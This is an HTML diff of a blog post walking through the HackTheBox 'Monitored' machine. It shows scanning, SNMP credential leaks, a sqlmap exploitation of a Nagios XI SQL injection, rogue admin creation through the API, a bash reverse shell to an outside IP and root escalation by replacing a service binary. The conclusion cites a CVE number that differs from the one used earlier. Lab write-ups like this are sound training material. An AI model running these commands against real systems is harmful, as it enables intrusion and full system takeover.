@@ -13,14 +13,20 @@
 
 
 <meta name="author" content="Dennis Drebitca">
-<meta name="description" content="Chief Dennis&#39; personal blog">
+<meta name="description" content="The Monitored HTB machine is a medium difficulty level HackTheBox Machine. The main tools and techniques used to crack this machine are:
+- Dirsearch- CVE-2023-40931- NMAP UDP scan- SNMP enumeration with SNMPwalk- JohnTheRipper- SQL injection with SQLmapReconnaissanceLink to headingWe start a broad Nmap TCP scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.248 -Pn -oG nmap_inicial Where the arguments mean:">
 <meta name="keywords" content="blog,developer,personal,cybersecurity,IT,cloud">
 
 <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Monitored HTB Walkthrough"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:description" content="The Monitored HTB machine is a medium difficulty level HackTheBox Machine. The main tools and techniques used to crack this machine are:
+- Dirsearch- CVE-2023-40931- NMAP UDP scan- SNMP enumeration with SNMPwalk- JohnTheRipper- SQL injection with SQLmapReconnaissanceLink to headingWe start a broad Nmap TCP scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.248 -Pn -oG nmap_inicial Where the arguments mean:"/>
 
 <meta property="og:title" content="Monitored HTB Walkthrough" />
-<meta property="og:description" content="" />
+<meta property="og:description" content="The Monitored HTB machine is a medium difficulty level HackTheBox Machine. The main tools and techniques used to crack this machine are:
+- Dirsearch- CVE-2023-40931- NMAP UDP scan- SNMP enumeration with SNMPwalk- JohnTheRipper- SQL injection with SQLmapReconnaissanceLink to headingWe start a broad Nmap TCP scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.248 -Pn -oG nmap_inicial Where the arguments mean:" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://chiefdennis.github.io/posts/htb_monitored/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2024-02-17T13:07:16+01:00" />
@@ -158,7 +164,7 @@
             </span>
             <span class="reading-time">
               <i class="fa fa-clock-o" aria-hidden="true"></i>
-              0-minute read
+              5-minute read
             </span>
           </div>
           <div class="authors">
@@ -169,11 +175,11 @@
           <div class="tags">
   <i class="fa fa-tag" aria-hidden="true"></i>
     <span class="tag">
-      <a href="/tags/hash-cracking/">Hash cracking</a>
+      <a href="/tags/nmap-udp/">NMAP UDP</a>
     </span>
       <span class="separator">•</span>
     <span class="tag">
-      <a href="/tags/hashcat/">Hashcat</a>
+      <a href="/tags/johntheripper/">JohnTheRipper</a>
     </span>
       <span class="separator">•</span>
     <span class="tag">
@@ -182,6 +188,22 @@
       <span class="separator">•</span>
     <span class="tag">
       <a href="/tags/dirsearch/">Dirsearch</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/udp-enumeration/">UDP enumeration</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/snmpwalk/">SNMPwalk</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/sqlmap/">SQLmap</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/sql-injection/">SQL Injection</a>
     </span></div>
 
         </div>
@@ -189,7 +211,144 @@
 
       <div class="post-content">
         
-        
+        <p><img src="Screenshot_20.png" alt="image"></p>
+<p>The Monitored HTB machine is a medium difficulty level HackTheBox Machine. The main tools and techniques used to crack this machine are:</p>
+<pre><code>    - Dirsearch
+    - CVE-2023-40931
+    - NMAP UDP scan
+    - SNMP enumeration with SNMPwalk
+    - JohnTheRipper
+    - SQL injection with SQLmap
+</code></pre>
+<h2 id="reconnaissance">
+  Reconnaissance
+  <a class="heading-link" href="#reconnaissance">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>We start a broad Nmap TCP scan by executing the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sS -T5 -vvv -p- 10.10.11.248 -Pn -oG nmap_inicial
+</span></span></code></pre></div><p>Where the arguments mean:</p>
+<pre><code>-sS: SYN port scan
+-T5: Using timing template 5 of NMAP
+-vvv: Triple verbose so NMAP prints a lot of information
+-p-: All ports are scanned
+-Pn: Skips Host Discovery
+-oG: Grep Format
+</code></pre>
+<p>The scan returns the following information:</p>
+<p><img src="Screenshot_2.png" alt="image"></p>
+<p>THere are a lot of open ports besides 22, 80 and 443. What is interesting is that port 389 (LDAP) is open. Next, we run a more comprehensive scan on the open ports to discover services and versions running on them:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sCV -p22,80,389,443,5667,8081 10.10.11.248 -oN nmap_exhaustivo -v
+</span></span></code></pre></div><p>Now the arguments used mean:</p>
+<pre><code>-sCV: Launches all scanning scripts to discover services and versions running on these ports
+-oN: Normal output format
+-v: Single verbose
+</code></pre>
+<p>The results for this second scan are the following:</p>
+<p><img src="Screenshot_3.png" alt="image"></p>
+<p>However, in this machine, there is more interesting ports to be discovered. This is revealed by running a NMAP UDP scan:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sU -p- 10.10.11.248 --defeat-icmp-ratelimit --min-rate <span class="m">5000</span> -oN nmap_udp
+</span></span></code></pre></div><pre><code>-sU: UDP scan
+-oN: Normal output format
+--defeat-icmp-ratelimit: Used to speed up the scan since UDP scans take longer
+--min-rate: Specifies the minimum packets/second transmitted
+</code></pre>
+<p>Te results for the UDP scan are the following:</p>
+<p><img src="Screenshot_4.png" alt="image"></p>
+<p>Port 161 is open. Now lets run a more comprehensive scan to see what is running on port 161, which is usually SNMP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sUCV -p161 10.10.11.248
+</span></span></code></pre></div><pre><code>-sUCV: Launches all scanning scripts to discover services and versions running on these ports over UDP.
+</code></pre>
+<p>This scan reveals that, in fact, the service running IS SNMP v2c. This is good because the SNMP reconnaissance can provide a lot of information.</p>
+<p><img src="Screenshot_5.png" alt="image"></p>
+<p>In the meantime, lets use dirsearch to do some subdomain discovery:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">dirsearch -u https://monitored.htb/ --exclude-status 403,404,500
+</span></span></code></pre></div><p><img src="Screenshot_1.png" alt="image"></p>
+<p>There is a interesting /nagios subdirectory. Upon trying to access the website, we are prompted for credentials which we don&rsquo;t have yet.</p>
+<p>Adding monitored.htb to /etc/hosts, we can visit the webpage. From there, we can acces the website https://monitored/nagiosxi/login, where we can log in with valid credentials. Default and common credentials don&rsquo;t work either, so we have to keep looking.</p>
+<h3 id="snmp-enumeration">
+  SNMP enumeration
+  <a class="heading-link" href="#snmp-enumeration">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>For SNMP enumeration, there is a very good guide on <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp"  class="external-link" target="_blank" rel="noopener">HackTricks</a>. We are going to use SNMPwalk with public credentials to see what information we can get:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">snmpwalk -v2c -c public 10.10.11.248
+</span></span></code></pre></div><p>There is a very interesting line where we can see the svc credentials:</p>
+<p><img src="Screenshot_6.png" alt="image"></p>
+<h2 id="initial-foothold">
+  Initial foothold
+  <a class="heading-link" href="#initial-foothold">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>With this credentials, we can log in to the nagios core portal, <a href="https://monitored.htb/nagios"  class="external-link" target="_blank" rel="noopener">https://monitored.htb/nagios</a>. We are greeted with the following panel:</p>
+<p><img src="Screenshot_7.png" alt="image"></p>
+<p>We can not do much here. Doing some research, I have stumbled upon <a href="https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567"  class="external-link" target="_blank" rel="noopener">CVE-2023-40931</a>. It represents a sql injection possible when authenticated. However, we need an authentication token to make it work. It can be obtained with a POST request to the api:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -ksX POST https://monitored.htb/nagiosxi/api/v1/authenticate --data <span class="s2">&#34;username=svc&amp;password=XjH7VCehowpR1xZB&#34;</span>
+</span></span></code></pre></div><p>The response is the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;svc&#34;</span>,<span class="s2">&#34;user_id&#34;</span>:<span class="s2">&#34;2&#34;</span>,<span class="s2">&#34;auth_token&#34;</span>:<span class="s2">&#34;6ed830a5d45b3fd199bcabf0dee5940ef39be98a&#34;</span>,<span class="s2">&#34;valid_min&#34;</span>:5,<span class="s2">&#34;valid_until&#34;</span>:<span class="s2">&#34;Sat, 17 Feb 2024 17:44:12 -0500&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>By specifying the valid_min parameter to a higher numer, the token will be valid for longer.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -ksX POST https://monitored.htb/nagiosxi/api/v1/authenticate --data <span class="s2">&#34;username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=1200&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;svc&#34;</span>,<span class="s2">&#34;user_id&#34;</span>:<span class="s2">&#34;2&#34;</span>,<span class="s2">&#34;auth_token&#34;</span>:<span class="s2">&#34;da04dba2da704a7f7a135585fbab1e0d7d75c1a8&#34;</span>,<span class="s2">&#34;valid_min&#34;</span>:1200,<span class="s2">&#34;valid_until&#34;</span>:<span class="s2">&#34;Sun, 18 Feb 2024 13:40:19 -0500&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>Now we have the necessary ingredients to exploit CVE-2023-40931. We have to make a POST resquest to /nagiosxi/admin/banner_message-ajaxhelper.php with the data action=acknowledge_banner_message&amp;id=3, where the parameter ID is injectable. For this SQL injection, we are going to use SQLmap, an automatic SQLi script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;https://monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=&lt;TOKEN&gt;&#34;</span> --level <span class="m">5</span> --risk <span class="m">3</span> -p id --batch -D nagiosxi --dump -T xi_users
+</span></span></code></pre></div><p>By dumping the xi_users table, we get the information of the users of nagiosxi:</p>
+<p><img src="Screenshot_8.png" alt="image"></p>
+<pre><code>- Nagios Administrator: nagiosadmin
+- apikey: IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+</code></pre>
+<p>We can try to also crack the hash using JohnTheRipper</p>
+<p><img src="Screenshot_9.png" alt="image"></p>
+<p>The credentials are:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nagiosadmin::test123
+</span></span></code></pre></div><p>These credentials don&rsquo;t work, so maybe the account is disabled or blocked. However, upon doing some more research, it seems like we can add another user to nagiosxi via the API (<a href="https://support.nagios.com/forum/viewtopic.php?t=42923%29"  class="external-link" target="_blank" rel="noopener">https://support.nagios.com/forum/viewtopic.php?t=42923)</a>. For this, the apikey we got earlier for the nagiosadmin user will be handy.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -ksX POST <span class="s2">&#34;https://monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#34;</span> -d <span class="s2">&#34;username=dennis&amp;password=dennis&amp;name=dennis&amp;email=dennis@localhost&amp;auth_level=admin&#34;</span>
+</span></span></code></pre></div><p><img src="Screenshot_10.png" alt="image"></p>
+<p>We now can access the nagiosxi portal using the credentials dennis::dennis. On the configure/Core Config Manager page, we can specify a custom command. This is a perfect way to establish a reverse shell to the underlying system.</p>
+<p><img src="Screenshot_12.png#center" alt="image"></p>
+<p>We can add the custom command which  will send a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.47/1234 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></div><p><img src="Screenshot_11.png#center" alt="image"></p>
+<p>However, no reverse shell is received. Doing some more digging, we have so set it up as s service. This is achieved in Service Management, editing one of the existing services to run our command.</p>
+<p><img src="Screenshot_13.png" alt="image"></p>
+<p>Now we have access to the underlying system as user nagios. We do some TTy treatment to have a full interactive tty:</p>
+<p><img src="Screenshot_14.png" alt="image"></p>
+<h2 id="privilege-escalation">
+  Privilege escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Lets see what commands can user nagios execute as root:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo -l
+</span></span></code></pre></div><p><img src="Screenshot_15.png" alt="image"></p>
+<p>There is interesting commands that this user can run. The most interesting one is manage_services.sh. This is what this script does:</p>
+<p><img src="Screenshot_17.png" alt="image"></p>
+<p>It looks like it can manage the services run under the nagios hood. This is interesting because we can maybe hikack this services. This is exactly what we are going to do with the npcd executable: Delete de original one, replace it with our own code and restart the services using manage_services.sh. It should retur a root shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rm /usr/local/nagios/bin/npcd <span class="c1"># Delete originl binary</span>
+</span></span><span class="line"><span class="cl">nano /usr/local/nagios/bin/npcd <span class="c1"># Create our own script</span>
+</span></span><span class="line"><span class="cl">chmod +x /usr/local/nagios/bin/npcd <span class="c1"># Give it +x permmissions</span>
+</span></span><span class="line"><span class="cl">sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd <span class="c1"># Restart the service</span>
+</span></span></code></pre></div><p>The content of the new executable is a new reverse shell, hopefully as root:</p>
+<p><img src="Screenshot_18.png#center" alt="image"></p>
+<p>And indeed, we now have root access to the system and can read the root flag. The machine is PWNED.</p>
+<p><img src="Screenshot_19.png" alt="image"></p>
+<h2 id="conclusion">
+  Conclusion
+  <a class="heading-link" href="#conclusion">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>This machine reveals the importance of not having insecure information avaliable via SNMTP, as this information leak can transform into a very severe security hole. With access to the svc account, we managed to leverage CVE-2023-51457 to access the admin panel and compromise the underlying system.</p>
+<p><img src="Screenshot_20.png" alt="image"></p>
+
       </div>
 
 
